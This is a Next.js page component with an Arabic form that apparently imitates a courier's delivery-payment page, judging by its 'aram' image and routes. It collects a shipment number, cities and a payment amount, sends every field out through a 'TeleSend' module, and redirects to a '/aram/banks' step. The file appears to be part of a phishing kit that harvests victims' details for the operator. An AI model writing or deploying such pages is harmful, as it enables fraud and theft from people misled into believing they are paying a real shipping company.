"use client"
import { useState } from 'react'
import styles from './fozajil.module.css'
// import bot from '@/app/dataBot'
import {useRouter,useSearchParams} from 'next/navigation'
import TeleSned from '@/server/TeleSend'
import Image from 'next/image'
import aram from "../../../public/arams.jpg"
const Page = () => {

  const {Send} = TeleSned();
  const  name = useSearchParams();
  const track = name.get("name")
  const [form,setForm]=useState({
    data:{
      from:"",
      to:"",
      نوع_الخدمة:"اختر الخدمة",
      قيمة:"",
      رقم_الشحنة:""
    }
  })
  
  
  const router = useRouter()

  const  handlerout =  () => {
    
if(form.data.نوع_الخدمة == "اختر الخدمة" || form.data.from == "" || form.data.to == "" || form.data.قيمة == ""|| form.data.رقم_الشحنة == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/aram/banks?names=${form.data.رقم_الشحنة}`)
    }
  }


  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToDiscord = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)
    
  };

  return (
    <div className={styles.contain} dir='rtl'>
      
      <Image src={aram} width={370}/>
        <form onSubmit={(e)=>{
          e.preventDefault();
          PostToDiscord();
        }}> 


    <select name="نوع_الخدمة" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required>
                <option value="اختر الخدمة">اختر الخدمة</option>
                <option value="طلب توصيل">طلب توصيل</option>
                <option value="طلب استلام">طلب استلام</option>
            </select>
            <input type="number"  name="رقم_الشحنة" placeholder='رقم الشحنة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <input type="text" name='from'  placeholder='من مدينة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <input type="text" name='to'  placeholder='الى مدينة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <input type="number" name='قيمة' placeholder='قيمة السداد' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />

        <button type='submit' onClick={handlerout}>تقديم الطلب</button>
        </form>
    </div>

  )
}

export default Page; 
